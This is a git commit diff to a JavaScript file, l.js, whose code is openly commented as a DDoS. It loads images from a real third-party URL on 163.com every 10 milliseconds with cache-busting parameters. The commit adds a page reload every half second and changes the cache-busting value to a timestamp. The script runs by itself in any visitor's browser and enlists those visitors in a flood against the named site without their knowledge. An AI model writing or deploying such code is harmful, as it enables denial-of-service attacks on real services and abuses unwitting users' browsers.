faaeb6b50206f6c27d424c6f4e1365c2aed911ff
甜力怕 <63779340+xiaozhu2007@users.noreply.github.com>
2022-12-22 09:08:26 +0800

    Update l.js

--- l.js
+++ l.js
@@ -1,15 +1,17 @@
 // TODO: JavaScript 跳转
 // window.location.href = 'https://xiaozhu2007.netlify.app/'
+setTimeout(() => {
+  window.location.search = `?time=${new Date().getTime()}`
+}, 500);
 
 // DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
 function imgflood() {
   var TARGET =
     "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
   var pic = new Image();
-  var rand = Math.floor(Math.random() * 114514);
-  pic.src = `${TARGET}&${rand}=jianshu.cn`;
+  pic.src = `${TARGET}&timestamp=${new Date().getTime()}`;
 }
 setTimeout(function () {
   setInterval(imgflood, 10);
-}, 5000);
+}, 8000);
 // End
